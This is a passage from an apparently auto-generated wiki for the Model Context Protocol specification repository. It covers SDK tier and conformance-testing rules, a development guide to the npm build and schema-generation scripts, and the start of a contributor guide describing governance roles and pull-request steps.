**Issue Triage** means labeling and determining whether an issue is valid, not necessarily resolving it. Triage response time is measured from issue creation to first label application.

**Critical Bug Resolution** time is measured from P0 label application to issue closure.

Sources: [docs/community/sdk-tiers.mdx:99-142]()

## Tier Advancement Process

SDK maintainers can request tier advancement by:

1. **Self-assess** against tier requirements
2. **Open an issue** in the `modelcontextprotocol/modelcontextprotocol` repository with supporting evidence:
   - Conformance test results
   - Documentation of feature completeness
   - Issue triage metrics
   - Maintenance commitment evidence
3. **Pass automated conformance testing** against the target tier's pass rate requirement
4. **Receive approval** from SDK Working Group maintainers

The SDK Working Group reviews advancement requests and makes final tier assignments. Advancement typically occurs during scheduled review periods aligned with specification releases.

Sources: [docs/community/sdk-tiers.mdx:80-89]()

## Tier Relegation

An SDK may be automatically moved to a lower tier if existing conformance tests on the latest stable release fail continuously for 4 weeks:

- **Tier 1 → Tier 2**: Any conformance test fails
- **Tier 2 → Tier 3**: More than 20% of conformance tests fail

This automatic relegation ensures tier classifications remain accurate and users can trust tier assignments. SDK maintainers are notified when tests begin failing and have the 4-week grace period to fix issues before relegation occurs.

Sources: [docs/community/sdk-tiers.mdx:91-97]()

## Quality Metrics and Maintenance Commitments

Beyond conformance testing, tier classification considers several quality metrics that reflect maintenance commitment and user experience:

### Documentation Requirements

| Tier | Requirement |
|------|-------------|
| **Tier 1** | Comprehensive documentation with examples for all features |
| **Tier 2** | Basic documentation covering core features |
| **Tier 3** | No minimum |

Tier 1 SDKs must provide complete documentation enabling users to understand and use all protocol features. Tier 2 SDKs must document core functionality. Documentation quality is evaluated during tier advancement reviews.

### Versioning and Release Policy

| Tier | Requirement |
|------|-------------|
| **Tier 1** | Published update policy with clear versioning (e.g., semantic versioning) |
| **Tier 2** | Published update policy with clear versioning |
| **Tier 3** | Not required |

**Clear Versioning** means following idiomatic versioning patterns with documented breaking change policies, so users can understand compatibility expectations when upgrading.

**Stable Release** is a published version explicitly marked as production-ready (e.g., version `1.0.0` or higher without pre-release identifiers like `-alpha`, `-beta`, or `-rc`).

### Roadmap and Feature Planning

| Tier | Requirement |
|------|-------------|
| **Tier 1** | Published roadmap |
| **Tier 2** | Published plan toward Tier 1 or explanation for remaining Tier 2 |
| **Tier 3** | Not required |

**Roadmap** outlines concrete steps and work items that track implementation of required MCP specification components (non-experimental features and optional capabilities), giving users visibility into upcoming feature support.

Sources: [docs/community/sdk-tiers.mdx:33-57]()

## Conformance Testing Workflow

The following diagram illustrates how conformance testing integrates with the SDK tier system and quality evaluation:

```mermaid
graph TB
    subgraph "SDK Development"
        DEV["SDK Implementation<br/>TypeScript, Python, Java, etc."]
        FEATURES["Feature Implementation<br/>Tools, Resources, Prompts,<br/>Sampling, Elicitation"]
    end
    
    subgraph "Conformance Testing"
        SUITE["Conformance Test Suite<br/>modelcontextprotocol/conformance"]
        RUN["Run Tests Against<br/>Target Spec Version"]
        CALC["Calculate Pass Rate<br/>Exclude: pending, skipped,<br/>experimental, legacy"]
        SCORE["Conformance Score<br/>% of applicable tests passed"]
    end
    
    subgraph "Quality Metrics"
        TRIAGE["Issue Triage<br/>Type, Status, Priority labels"]
        RESPONSE["Response Time<br/>First label within SLA"]
        CRITICAL["Critical Bug Resolution<br/>P0 closure within SLA"]
        DOCS["Documentation<br/>Completeness check"]
        VERSION["Versioning Policy<br/>Clear breaking changes"]
        ROADMAP["Published Roadmap<br/>Feature planning"]
    end
    
    subgraph "Tier Classification"
        T1_CHECK["Tier 1 Evaluation<br/>100% conformance +<br/>all quality metrics"]
        T2_CHECK["Tier 2 Evaluation<br/>80% conformance +<br/>quality metrics"]
        T3_CHECK["Tier 3 Evaluation<br/>No minimum requirements"]
        ASSIGN["Tier Assignment<br/>T1, T2, or T3"]
    end
    
    subgraph "Ongoing Monitoring"
        MONITOR["Continuous Monitoring<br/>Latest stable release"]
        FAIL_TRACK["Track Test Failures<br/>4-week grace period"]
        RELEGATE["Automatic Relegation<br/>If thresholds exceeded"]
    end
    
    DEV --> FEATURES
    FEATURES --> RUN
    RUN --> CALC
    CALC --> SCORE
    
    SCORE --> T1_CHECK
    SCORE --> T2_CHECK
    SCORE --> T3_CHECK
    
    TRIAGE --> RESPONSE
    RESPONSE --> T1_CHECK
    RESPONSE --> T2_CHECK
    
    CRITICAL --> T1_CHECK
    CRITICAL --> T2_CHECK
    
    DOCS --> T1_CHECK
    DOCS --> T2_CHECK
    
    VERSION --> T1_CHECK
    VERSION --> T2_CHECK
    
    ROADMAP --> T1_CHECK
    ROADMAP --> T2_CHECK
    
    T1_CHECK --> ASSIGN
    T2_CHECK --> ASSIGN
    T3_CHECK --> ASSIGN
    
    ASSIGN --> MONITOR
    MONITOR --> FAIL_TRACK
    FAIL_TRACK --> RELEGATE
```

Sources: [docs/community/sdk-tiers.mdx]()

## Conformance Test Execution

The following diagram shows how conformance tests are executed and how results map to SDK tier requirements:

```mermaid
graph LR
    subgraph "Test Execution"
        SDK_IMPL["SDK Under Test<br/>e.g., python-sdk,<br/>typescript-sdk"]
        TEST_RUNNER["Test Runner<br/>Execute conformance<br/>test suite"]
        SPEC_VERSION["Target Spec Version<br/>2024-11-05, 2025-11-25,<br/>draft, etc."]
    end
    
    subgraph "Test Filtering"
        ALL_TESTS["All Tests in Suite"]
        FILTER_VERSION["Filter by<br/>Spec Version"]
        FILTER_STATUS["Exclude:<br/>pending, skipped"]
        FILTER_EXPERIMENTAL["Exclude:<br/>experimental features"]
        FILTER_LEGACY["Exclude:<br/>legacy tests<br/>unless claimed"]
        APPLICABLE["Applicable Tests<br/>for Scoring"]
    end
    
    subgraph "Results"
        PASSED["Passed Tests"]
        FAILED["Failed Tests"]
        CALC_RATE["Pass Rate %<br/>= Passed / Applicable"]
    end
    
    subgraph "Tier Mapping"
        RATE_100["100% Pass Rate"]
        RATE_80_99["80-99% Pass Rate"]
        RATE_BELOW_80["Below 80% Pass Rate"]
        TIER_1["Tier 1 Eligible<br/>+ quality metrics"]
        TIER_2["Tier 2 Eligible<br/>+ quality metrics"]
        TIER_3["Tier 3<br/>No minimum"]
    end
    
    SDK_IMPL --> TEST_RUNNER
    SPEC_VERSION --> TEST_RUNNER
    TEST_RUNNER --> ALL_TESTS
    
    ALL_TESTS --> FILTER_VERSION
    FILTER_VERSION --> FILTER_STATUS
    FILTER_STATUS --> FILTER_EXPERIMENTAL
    FILTER_EXPERIMENTAL --> FILTER_LEGACY
    FILTER_LEGACY --> APPLICABLE
    
    APPLICABLE --> PASSED
    APPLICABLE --> FAILED
    
    PASSED --> CALC_RATE
    FAILED --> CALC_RATE
    
    CALC_RATE --> RATE_100
    CALC_RATE --> RATE_80_99
    CALC_RATE --> RATE_BELOW_80
    
    RATE_100 --> TIER_1
    RATE_80_99 --> TIER_2
    RATE_BELOW_80 --> TIER_3
```

Sources: [docs/community/sdk-tiers.mdx:59-78]()

## Integration with Build System

Conformance testing is integrated into the specification repository's build system. The `npm run check` command includes schema validation and can be extended to run conformance tests:

- `npm run check:schema` - Validates schema generation and examples
- `npm run check:docs` - Validates documentation formatting and links
- `npm run check:seps` - Validates SEP documents

SDK repositories should integrate conformance testing into their CI/CD pipelines to continuously validate protocol compliance.

Sources: [package.json:32-42]()

## Reporting and Transparency

Conformance test results are published to enable transparency:

- **Public test results** for each SDK and specification version
- **Tier assignments** published with supporting evidence
- **Failure tracking** for SDKs approaching relegation thresholds
- **Metrics dashboards** showing issue triage and resolution times

This transparency allows users to make informed decisions about SDK selection and helps maintainers understand where improvements are needed.

## Best Practices for SDK Maintainers

### Achieving Tier 1 Status

1. **Implement all non-experimental features** from the target specification version
2. **Achieve 100% conformance** on applicable tests
3. **Establish clear issue triage process** with consistent labeling
4. **Maintain SLA compliance** for response times and critical bug resolution
5. **Publish comprehensive documentation** with examples for all features
6. **Adopt semantic versioning** with clear breaking change policies
7. **Publish a roadmap** showing planned feature implementations
8. **Create stable releases** (e.g., `1.0.0` or higher)

### Maintaining Tier Status

1. **Monitor conformance test results** continuously
2. **Respond to test failures** within the 4-week grace period
3. **Maintain issue triage SLAs** consistently
4. **Update documentation** when features change
5. **Communicate roadmap changes** to users
6. **Plan for new specification versions** before release

### Handling Test Failures

When conformance tests fail:

1. **Identify root cause** - Protocol implementation bug or test issue?
2. **Create issue** with `P0` label if core functionality affected
3. **Develop fix** and validate against test suite
4. **Update documentation** if behavior changed
5. **Release update** and verify test passage

Sources: [docs/community/sdk-tiers.mdx]()

## Related Resources

- [SDK Tier System](6.1) - Detailed tier requirements and advancement process
- [Available SDKs and Language Support](6.2) - Current SDK catalog and tier status
- [Protocol Specification](2) - Complete MCP protocol documentation
- [Contributing to MCP](7.1) - How to contribute to the specification repository

---

# Page: Development Guide

# Development Guide

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)
- [package-lock.json](package-lock.json)
- [package.json](package.json)
- [scripts/check-mdx-comments.ts](scripts/check-mdx-comments.ts)
- [scripts/generate-schemas.ts](scripts/generate-schemas.ts)
- [tsconfig.json](tsconfig.json)

</details>



This guide introduces developers to contributing to the Model Context Protocol specification repository. It covers setting up your development environment, understanding the build system, and navigating the contribution workflows.

For detailed information about specific topics:
- Contribution policies and code review process: see [Contributing Guidelines](#6.1)
- Proposing protocol changes via SEPs: see [Specification Enhancement Process](#6.2)
- Working with TypeScript schemas: see [Schema Development Workflow](#6.3)
- Build scripts and CI pipelines: see [Build System and CI/CD](#6.4)
- Documentation infrastructure: see [Documentation System](#6.5)

For governance and community structure, see [Governance and Community](#7).

## Repository Structure

The specification repository is organized into distinct subsystems, each with specific responsibilities:

```mermaid
graph TB
    subgraph "Protocol Definition"
        SchemaDir["schema/<br/>TypeScript definitions<br/>5 versions"]
        DraftSchema["schema/draft/schema.ts<br/>Active development"]
        StableSchema["schema/2025-11-25/schema.ts<br/>Current stable"]
    end
    
    subgraph "Generated Artifacts"
        JSONSchemas["schema/*/schema.json<br/>Machine-readable"]
        MDXSchemas["docs/specification/*/schema.mdx<br/>Human-readable API docs"]
    end
    
    subgraph "Documentation"
        DocsDir["docs/<br/>Mintlify MDX files"]
        DocsJSON["docs.json<br/>Site configuration"]
        StyleCSS["docs/style.css<br/>Custom styling"]
    end
    
    subgraph "Blog"
        BlogContent["blog/content/<br/>Hugo markdown posts"]
        HugoConfig["blog/hugo.toml<br/>Hugo configuration"]
    end
    
    subgraph "SEPs"
        SEPsDir["seps/<br/>Enhancement proposals"]
        SEPTemplate["seps/TEMPLATE.md"]
    end
    
    subgraph "Build System"
        PackageJSON["package.json<br/>npm scripts"]
        GenScript["scripts/generate-schemas.ts<br/>Schema generation"]
        CIMain[".github/workflows/main.yml<br/>Schema validation"]
        CIMd[".github/workflows/markdown-format.yml<br/>Doc validation"]
    end
    
    DraftSchema --> GenScript
    StableSchema --> GenScript
    GenScript --> JSONSchemas
    GenScript --> MDXSchemas
    
    PackageJSON --> GenScript
    PackageJSON --> DocsDir
    PackageJSON --> BlogContent
    
    CIMain --> GenScript
    CIMd --> DocsDir
    CIMd --> SEPsDir
```

**Repository Layout:**

| Directory | Purpose | Generated? |
|-----------|---------|------------|
| `schema/*/` | TypeScript protocol definitions (5 versions) | No |
| `schema/*/schema.json` | JSON Schema output for validation | Yes |
| `docs/specification/*/schema.mdx` | API reference documentation | Yes |
| `docs/` | Mintlify documentation pages (MDX) | No |
| `blog/` | Hugo blog with PaperMod theme | No |
| `seps/` | Specification Enhancement Proposals | No |
| `scripts/` | Build automation scripts | No |
| `.github/workflows/` | CI/CD pipeline definitions | No |

Sources: [CONTRIBUTING.md:1-185](), [package.json:1-57](), [scripts/generate-schemas.ts:1-149]()

## Development Environment Setup

### Prerequisites

The following software is required:

- **Node.js 20 or above** (specified in [package.json:11-12]())
- **npm** (included with Node.js)
- **nvm** (optional, for managing Node versions)
- **TypeScript** (dev dependency)
- **Mintlify CLI** (optional, for local documentation preview)
- **Hugo** (optional, for blog development)

### Installation

```bash
# Clone your fork
git clone https://github.com/YOUR-USERNAME/modelcontextprotocol.git
cd modelcontextprotocol

# Install correct Node version (if using nvm)
nvm install

# Install dependencies
npm install

# Verify installation
npm run check
```

The `npm run check` command [package.json:24]() runs all validation checks to ensure your environment is correctly configured.

Sources: [CONTRIBUTING.md:8-34](), [package.json:10-12]()

### Verification

After installation, verify that all systems work correctly:

```bash
# Validate TypeScript schema definitions
npm run check:schema:ts

# Check generated JSON schemas match source
npm run check:schema:json

# Check generated MDX docs match source
npm run check:schema:md

# Validate documentation formatting
npm run check:docs:format

# Check for broken internal links
npm run check:docs:links
```

All checks should pass without errors. If any checks fail, the output will indicate which files need attention.

Sources: [package.json:23-31](), [CONTRIBUTING.md:44-54]()

## Development Workflows

The repository supports four primary development workflows:

```mermaid
graph LR
    subgraph "Schema Development"
        EditTS["Edit<br/>schema/draft/schema.ts"]
        GenSchema["npm run generate:schema"]
        CheckSchema["npm run check:schema"]
        
        EditTS --> GenSchema
        GenSchema --> CheckSchema
    end
    
    subgraph "Documentation"
        EditDocs["Edit<br/>docs/**/*.mdx"]
        ServeDocs["npm run serve:docs"]
        CheckDocs["npm run check:docs"]
        FormatDocs["npm run format"]
        
        EditDocs --> ServeDocs
        EditDocs --> CheckDocs
        CheckDocs --> FormatDocs
    end
    
    subgraph "Blog"
        EditBlog["Edit<br/>blog/content/**/*.md"]
        ServeBlog["npm run serve:blog"]
        
        EditBlog --> ServeBlog
    end
    
    subgraph "SEP Proposals"
        DraftSEP["Create<br/>seps/0000-feature.md"]
        CreatePR["Create PR"]
        UpdateNumber["Rename to<br/>seps/{PR}-feature.md"]
        FindSponsor["Find sponsor<br/>from MAINTAINERS.md"]
        
        DraftSEP --> CreatePR
        CreatePR --> UpdateNumber
        UpdateNumber --> FindSponsor
    end
```

### Schema Development Workflow

When modifying protocol definitions:

1. Edit TypeScript definitions in `schema/draft/schema.ts` only
2. **Do not** manually edit `schema/draft/schema.json` or `docs/specification/draft/schema.mdx`
3. Run `npm run generate:schema` to regenerate artifacts [package.json:33-35]()
4. Verify changes with `npm run check:schema` [package.json:28]()

For detailed information about the schema generation pipeline and version management, see [Schema Development Workflow](#6.3).

### Documentation Workflow

When updating documentation:

1. Edit MDX files in `docs/` directory
2. Preview locally with `npm run serve:docs` [package.json:37]()
3. Check formatting with `npm run check:docs:format` [package.json:26]()
4. Validate links with `npm run check:docs:links` [package.json:27]()
5. Auto-fix formatting with `npm run format` [package.json:32]()

For documentation infrastructure details, see [Documentation System](#6.5).

### Blog Workflow

When creating blog posts:

1. Add markdown files to `blog/content/posts/`
2. Preview with `npm run serve:blog` [package.json:38]()
3. Format is validated by the same `check:docs:format` script

### SEP Proposal Workflow

When proposing protocol changes:

1. Draft SEP as `seps/0000-feature-name.md` using [seps/TEMPLATE.md]()
2. Create pull request to add file
3. Update SEP number in file and filename to match PR number
4. Request sponsor from [MAINTAINERS.md:1-181]()
5. Iterate on feedback in PR comments

For complete SEP process details, see [Specification Enhancement Process](#6.2).

Sources: [CONTRIBUTING.md:42-86](), [package.json:23-38](), [seps/1850-pr-based-sep-workflow.md:1-185]()

## Build System Overview

The build system uses npm scripts to orchestrate TypeScript compilation, schema generation, documentation validation, and formatting:

```mermaid
graph TB
    subgraph "Top-Level Commands"
        Check["npm run check"]
        PrepChanges["npm run prep:changes"]
        Format["npm run format"]
    end
    
    subgraph "Schema Pipeline"
        CheckSchemaTS["check:schema:ts<br/>tsc + eslint + prettier"]
        CheckSchemaJSON["check:schema:json<br/>generate-schemas.ts --check"]
        CheckSchemaMD["check:schema:md<br/>typedoc comparison"]
        GenSchemaJSON["generate:schema:json<br/>typescript-json-schema"]
        GenSchemaMD["generate:schema:md<br/>typedoc"]
        
        CheckSchemaTS --> CheckSchemaJSON
        CheckSchemaJSON --> CheckSchemaMD
        
        GenSchemaJSON -.generates.-> CheckSchemaJSON
        GenSchemaMD -.generates.-> CheckSchemaMD
    end
    
    subgraph "Documentation Pipeline"
        CheckDocsFormat["check:docs:format<br/>prettier --check"]
        CheckDocsLinks["check:docs:links<br/>mint broken-links"]
        
        Format -.fixes.-> CheckDocsFormat
    end
    
    Check --> CheckSchemaTS
    Check --> CheckDocsFormat
    
    PrepChanges --> CheckSchemaTS
    PrepChanges --> GenSchemaJSON
    PrepChanges --> GenSchemaMD
    PrepChanges --> CheckDocsFormat
    PrepChanges --> Format
```

### Available Scripts

| Command | Purpose | Mode |
|---------|---------|------|
| `npm run check` | Run all validation checks | Validation |
| `npm run check:schema` | Validate schema files | Validation |
| `npm run check:schema:ts` | Check TypeScript syntax | Validation |
| `npm run check:schema:json` | Verify JSON schemas are current | Validation |
| `npm run check:schema:md` | Verify MDX docs are current | Validation |
| `npm run check:docs` | Validate documentation | Validation |
| `npm run check:docs:format` | Check markdown formatting | Validation |
| `npm run check:docs:links` | Find broken links | Validation |
| `npm run generate:schema` | Generate JSON + MDX schemas | Generation |
| `npm run generate:schema:json` | Generate JSON schemas | Generation |
| `npm run generate:schema:md` | Generate MDX documentation | Generation |
| `npm run format` | Auto-fix markdown formatting | Generation |
| `npm run prep:changes` | Full validation + generation + format | Combined |
| `npm run serve:docs` | Preview documentation locally | Development |
| `npm run serve:blog` | Preview blog locally | Development |

Sources: [package.json:23-38]()

### Schema Generation Pipeline

The `generate-schemas.ts` script [scripts/generate-schemas.ts:1-149]() generates JSON schemas and MDX documentation from TypeScript source:

**Version Handling:**

```typescript
// Legacy versions use JSON Schema draft-07
const LEGACY_SCHEMAS = ['2024-11-05', '2025-03-26', '2025-06-18'];

// Modern versions use JSON Schema 2020-12
const MODERN_SCHEMAS = ['2025-11-25', 'draft'];
```

**Generation Process:**

1. For each schema version in `schema/*/schema.ts`
2. Run `typescript-json-schema` to produce JSON Schema [scripts/generate-schemas.ts:93-96]()
3. For modern versions, apply transformations [scripts/generate-schemas.ts:103-104]():
   - Replace `http://json-schema.org/draft-07/schema#` with `https://json-schema.org/draft/2020-12/schema`
   - Replace `"definitions":` with `"$defs":`
   - Replace `#/definitions/` with `#/$defs/`
4. Run TypeDoc to generate MDX API documentation [package.json:35]()

**Check Mode:**

When run with `--check` flag [scripts/generate-schemas.ts:20](), the script validates that committed files match what would be generated, preventing forgotten regeneration.

For detailed schema workflow information, see [Schema Development Workflow](#6.3).

Sources: [scripts/generate-schemas.ts:1-149](), [package.json:30-35]()

### CI/CD Validation

Two GitHub Actions workflows enforce code quality:

#### Main Validation Workflow

[.github/workflows/main.yml:1-29]() runs on every push and pull request:

```yaml
- Check TypeScript definitions (check:schema:ts)
- Check schema.json files are up to date (check:schema:json)
- Check schema.mdx files are up to date (check:schema:md)
```

This ensures that generated artifacts are never committed without regenerating from source.

#### Markdown Format Workflow

[.github/workflows/markdown-format.yml:1-32]() runs when `.md` or `.mdx` files change:

```yaml
- Check markdown formatting (check:docs:format)
- Check markdown links (check:docs:links)
```

This maintains consistent documentation style and prevents broken internal links.

For complete CI/CD details, see [Build System and CI/CD](#6.4).

Sources: [.github/workflows/main.yml:1-29](), [.github/workflows/markdown-format.yml:1-32]()

## Quick Reference

### Common Development Commands

```bash
# Before starting work
git checkout -b feature/your-feature-name
npm install

# Schema development
npm run check:schema:ts              # Validate TypeScript
npm run generate:schema              # Regenerate JSON + MDX
npm run check:schema                 # Verify everything matches

# Documentation development
npm run serve:docs                   # Preview at localhost
npm run check:docs:format            # Check formatting
npm run format                       # Auto-fix formatting
npm run check:docs:links             # Find broken links

# Before committing
npm run prep:changes                 # All checks + generate + format

# Full validation
npm run check                        # Run all checks
```

### Pre-Commit Checklist

Before submitting a pull request:

- [ ] Run `npm run prep:changes` to generate artifacts and validate
- [ ] All CI checks pass locally
- [ ] Changes follow existing code style
- [ ] Generated files (`schema.json`, `schema.mdx`) are included if schema changed
- [ ] Documentation updated if behavior changed
- [ ] Links tested if documentation changed
- [ ] SEP filed if protocol change is substantial (see [SEP Guidelines](#6.2))

### File Modification Rules

| File Pattern | Can Edit Directly? | Generation Command |
|-------------|-------------------|-------------------|
| `schema/*/schema.ts` | ✅ Yes | N/A |
| `schema/*/schema.json` | ❌ No | `npm run generate:schema:json` |
| `docs/specification/*/schema.mdx` | ❌ No | `npm run generate:schema:md` |
| `docs/**/*.mdx` (other) | ✅ Yes | N/A |
| `blog/content/**/*.md` | ✅ Yes | N/A |
| `seps/**/*.md` | ✅ Yes | N/A |

**Never manually edit generated files.** The CI pipeline will reject PRs where generated files don't match their source.

Sources: [CONTRIBUTING.md:42-76](), [package.json:23-38]()

### Getting Help

- **Discord**: For real-time contributor discussion: [Community Communication](#7.4)
- **GitHub Discussions**: For structured questions: https://github.com/modelcontextprotocol/modelcontextprotocol/discussions
- **GitHub Issues**: For bug reports and feature requests
- **SEP Process**: For protocol changes: [Specification Enhancement Process](#6.2)
- **Maintainers**: Listed in [MAINTAINERS.md:1-181]()

For community communication guidelines and governance structure, see [Governance and Community](#7).

Sources: [docs/community/communication.mdx:1-107](), [CONTRIBUTING.md:1-185]()

---

# Page: Contributing to MCP

# Contributing to MCP

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [CLAUDE.md](CLAUDE.md)
- [MAINTAINERS.md](MAINTAINERS.md)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)

</details>



This page explains how to contribute to the Model Context Protocol project, including prerequisites, repository structure, contribution workflows, and the tools and processes used by maintainers and contributors.

**Scope:** This document covers contributions to the core MCP project—the specification, official SDKs, documentation, and governance processes. For information about building MCP servers and clients (rather than contributing to MCP itself), see the [Server Development](#5) and [Client Ecosystem](#4) sections. For details on the SEP (Specification Enhancement Proposal) process specifically, see [Specification Enhancement Process](#7.2). For information about the build system and schema generation, see [Schema Development and Generation](#7.3) and [Build System and Automation](#7.4).

---

## Prerequisites and Setup

### Required Tools

Before contributing, ensure you have the following installed:

| Tool | Version | Purpose |
|------|---------|---------|
| **Git** | Any recent version | Cloning repositories and submitting changes |
| **Node.js** | 24+ | Building, testing, and schema generation |
| **npm** | 11+ | Dependency management (comes with Node.js) |
| **GitHub account** | — | Submitting pull requests and issues |
| **Language tooling** | Varies | For SDK contributions (Python, Rust, Go, etc.) |

Verify your setup:

```bash
node --version  # Should be 24.x or higher
npm --version   # Should be 11.x or higher
git --version   # Any recent version
```

Sources: [docs/community/contributing.mdx:13-28]()

### Repository Structure

MCP spans multiple repositories in the [`modelcontextprotocol`](https://github.com/modelcontextprotocol) GitHub organization:

| Repository | Contents |
|------------|----------|
| `modelcontextprotocol/modelcontextprotocol` | Specification, documentation, SEPs, schema |
| `modelcontextprotocol/typescript-sdk` | TypeScript/JavaScript SDK |
| `modelcontextprotocol/python-sdk` | Python SDK |
| `modelcontextprotocol/go-sdk` | Go SDK |
| `modelcontextprotocol/java-sdk` | Java SDK |
| `modelcontextprotocol/kotlin-sdk` | Kotlin SDK |
| `modelcontextprotocol/csharp-sdk` | C# SDK |
| `modelcontextprotocol/swift-sdk` | Swift SDK |
| `modelcontextprotocol/rust-sdk` | Rust SDK |
| `modelcontextprotocol/ruby-sdk` | Ruby SDK |
| `modelcontextprotocol/php-sdk` | PHP SDK |

The **specification repository** (`modelcontextprotocol/modelcontextprotocol`) is the primary repository for protocol changes, documentation, and SEPs. Most of this guide focuses on contributing to this repository.

Sources: [docs/community/contributing.mdx:35-57]()

---

## Project Roles and Governance

MCP follows a hierarchical governance model with four levels of responsibility:

```mermaid
graph TD
    A["Lead Maintainers<br/>(BDFL)<br/>Final decision authority"]
    B["Core Maintainers<br/>Overall project direction<br/>Review SEPs"]
    C["Maintainers<br/>SDKs, Working Groups,<br/>Components"]
    D["Contributors<br/>Issues, PRs,<br/>Discussions"]
    
    A --> B
    B --> C
    C --> D
    
    A -.->|veto any decision| B
    B -.->|veto decisions| C
```

**Contributor** - Anyone who files issues, submits PRs, or participates in discussions. This is the entry point for all contributors.

**Maintainer** - Stewards specific areas like SDKs, documentation, or Working Groups. Maintainers have write/admin access to their respective repositories and make decisions independently for their areas.

**Core Maintainer** - Guides overall project direction, reviews SEPs, and oversees the specification. Core Maintainers meet bi-weekly to discuss proposals and project direction.

**Lead Maintainer** - Final decision makers (Benevolent Dictator for Life model). Currently: David Soria Parra and Justin Spahr-Summers (inactive).

Find the current list of maintainers in [MAINTAINERS.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md).

Sources: [docs/community/governance.mdx:20-84](), [MAINTAINERS.md:1-211]()

---

## Your First Contribution

### Step 1: Set Up Your Environment

**Fork the repository** - Click the **Fork** button on the [specification repository](https://github.com/modelcontextprotocol/modelcontextprotocol) to create your own copy.

**Clone your fork:**

```bash
git clone https://github.com/YOUR-USERNAME/modelcontextprotocol.git
cd modelcontextprotocol
```

**Install dependencies:**

```bash
npm install
```

This installs tools for schema generation, documentation building, and validation.

**Verify everything works:**

```bash
npm run check
```

This runs TypeScript compilation, schema validation, example validation, documentation link checks, and formatting checks. If all pass, your environment is ready.

Sources: [docs/community/contributing.mdx:85-125]()

### Step 2: Find Something to Work On

Good starting points for new contributors:

1. **Documentation improvements** - Fix typos, unclear explanations, broken links, or incomplete examples
2. **Issues labeled `good first issue`** - Tagged in the [specification repo](https://github.com/modelcontextprotocol/modelcontextprotocol/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
3. **Schema examples** - Add examples to `schema/draft/examples/` to help developers understand protocol primitives

Sources: [docs/community/contributing.mdx:127-138]()

### Step 3: Make Your Change

**Create a branch:**

```bash
git checkout -b fix/your-description
```

Use a descriptive branch name like `fix/typo-in-tools-doc` or `feat/add-example-for-resources`.

**Make your changes** - Edit relevant files. If editing schema files, run `npm run generate:schema` to regenerate the JSON schema and documentation.

**Run checks:**

```bash
npm run check
```

Fix any issues before committing. Use `npm run format` to auto-fix formatting errors.

**Commit with a clear message:**

```bash
git commit -m "Fix typo in tools documentation"
```

Write concise messages describing what changed and why. Reference issue numbers if applicable (e.g., `Fix typo in tools documentation (#123)`).

Sources: [docs/community/contributing.mdx:140-177]()

### Step 4: Submit a Pull Request

**Push your branch:**

```bash
git push origin fix/your-description
```

**Open a PR on GitHub** - Use the GitHub CLI or navigate to your fork and click **Compare & pull request**.

**Fill in the PR template** - Provide a clear description of your changes and link any related issues.

**Wait for review** - Maintainers typically respond within 1-5 business days.

Sources: [docs/community/contributing.mdx:179-212]()

---

## Types of Contributions

Different contributions follow different processes depending on scope:

### Small Changes (Direct PR)

Submit a pull request directly for:

- Bug fixes and typo corrections
- Documentation improvements (clarity, ambiguity fixes)
- Adding examples to existing features
- Minor schema fixes that don't materially change the specification
- Test improvements

### Major Changes (SEP Required)

Anything that changes the MCP specification requires the [Specification Enhancement Proposal (SEP)](#7.2) process:

- New protocol features or API methods
- Breaking changes to existing behavior
- Changes to message format or schema structure
- New interoperability standards
- Governance or process changes

**Examples requiring SEP:**

- Adding a new RPC method like `tools/execute`
- Changing authentication and authorization mechanisms
- Adding new capability negotiation fields
- Modifying the transport layer specification

Sources: [docs/community/contributing.mdx:231-269]()

---

## Working with the Specification Repository

### Schema Changes

The TypeScript schema (`schema/draft/schema.ts`) is the **source of truth** for the protocol. It defines every message type, request/response structure, and primitive (tools, resources, prompts) that clients and servers exchange. SDK implementers across all languages rely on this schema.

When you run `npm run generate:schema`, it generates:

- The JSON schema (`schema/draft/schema.json`) for validation
- The Schema Reference documentation (`docs/specification/draft/schema.mdx`)

**To modify the schema:**

1. Edit the TypeScript schema in `schema/draft/schema.ts`
2. Add JSON examples in `schema/draft/examples/[TypeName]/` (e.g., `Tool/my-example.json`). Reference them using `@example` + `@includeCode` JSDoc tags.
3. Generate JSON schema and docs: `npm run generate:schema`
4. Validate your changes: `npm run check`

Sources: [docs/community/contributing.mdx:270-314](), [CLAUDE.md:19-34]()

### Documentation Changes

Docs are written in [MDX format](https://mdxjs.com/) (Markdown with JSX components) and powered by [Mintlify](https://mintlify.com/). The `docs/` directory contains:

- `docs/docs/` - Guides and tutorials for getting started and building with MCP
- `docs/specification/` - Formal protocol specification (versioned by date)

**To contribute to documentation:**

1. Start the local docs server: `npm run serve:docs` (launches at `http://localhost:3000` with hot reloading)
2. Edit the relevant `.mdx` files. Use [Mintlify components](https://www.mintlify.com/docs/components) like `<Note>`, `<Tip>`, `<Steps>`, and `<Card>` for richer formatting.
